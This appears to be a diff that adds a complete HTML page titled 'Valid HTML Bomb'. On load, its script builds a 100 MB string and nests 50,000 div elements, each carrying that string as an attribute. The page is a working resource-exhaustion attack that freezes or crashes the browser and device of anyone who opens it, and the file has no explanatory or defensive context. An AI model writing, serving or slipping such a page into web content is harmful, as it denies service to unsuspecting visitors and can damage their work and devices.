@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Valid HTML Bomb</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+    }
+    .bomb {
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    // ATTENTION:
+    const depth = 50000;
+    const payloadSizeMB = 100;
+
+    const payload = "A".repeat(payloadSizeMB * 1024 * 1024);
+
+    function addBomb() {
+      let root = document.body;
+      for (let i = 0; i < depth; i++) {
+        const div = document.createElement("div");
+        div.className = "bomb";
+        div.setAttribute("data-bomb", payload);
+        root.appendChild(div);
+        root = div;
+      }
+    }
+    // Execute
+    addBomb();
+  </script>
+</body>
+</html>
